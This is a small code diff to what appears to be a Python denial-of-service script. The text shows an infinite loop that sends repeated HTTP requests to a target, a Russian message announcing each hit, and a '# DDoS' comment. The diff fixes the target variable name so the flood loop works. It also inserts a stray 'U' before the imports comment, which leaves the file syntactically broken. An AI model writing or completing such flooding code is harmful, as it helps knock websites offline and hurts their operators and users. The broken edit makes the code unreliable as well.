@@ -1,4 +1,4 @@
-# Imports
+U# Imports
 import socket
 "import wget"
 from itertools import count
@@ -212,7 +212,7 @@ error = 0
 "import wget"
 
 while True:
-  requests.get(targ)
+  requests.get(target)
   print("[+] Заход на сайт выполнен!")
   
 # DDoS
